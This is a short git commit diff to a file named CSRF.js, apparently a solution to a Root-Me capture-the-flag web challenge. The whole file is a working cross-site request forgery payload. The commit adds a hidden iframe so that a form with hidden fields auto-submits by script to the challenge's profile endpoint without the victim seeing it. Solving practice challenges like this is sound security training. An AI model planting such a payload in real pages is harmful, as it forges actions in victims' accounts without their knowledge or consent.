09427583aad5b63964ae57bb3f02e1e6990a7371
hardek96 <35901268+hardek96@users.noreply.github.com>
2020-04-07 00:53:18 +0200

    Update CSRF.js

--- CSRF.js
+++ CSRF.js
@@ -1,10 +1,12 @@
-<form id="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post">
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" target="csrf-frame" method="post">
   <input type="hidden"
       name="username"
       value="hello"/>
   <input type="hidden"
       name="status"
       value="on"/>
-  
+  <input type='submit' value='submit'>
 </form>
+
 <script>document.getElementById("form").submit();</script>
